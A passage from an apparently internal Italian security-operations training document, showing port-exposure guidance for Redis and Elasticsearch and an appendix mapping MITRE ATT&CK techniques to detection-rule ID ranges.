| Redis | 6379 | TCP | Never expose — no auth by default |
| Elasticsearch | 9200, 9300 | TCP | Restrict to monitoring VLAN |

---

## Appendice D — MITRE ATT&CK Mapping for Detection Rules

| Technique ID | Name | Detection Rule SID Range |
|-------------|------|-------------------------|
| T1046 | Network Service Discovery | 9000001-9000009 |
| T1059 | Command & Scripting Interpreter | 9000010-9000019 |
| T1071 | Application Layer Protocol (C2) | 6000020-6000029, 9000020-9000029 |
| T1048 | Exfiltration Over Alternative Protocol | 9000020-9000021 |
| T1110 | Brute Force | 5000001-5000002 |
| T1190 | Exploit Public-Facing Application | 6000001-6000012 |
| T1572 | Protocol Tunneling | 9000020-9000021 |
| T1040 | Network Sniffing | Zeek notice framework |
| T1021 | Remote Services | Wazuh rule 100002 |

---

*Documento redatto per il programma interno di formazione — IT Security Operations & Red Team.*
*Revisione: 2026-05-07*
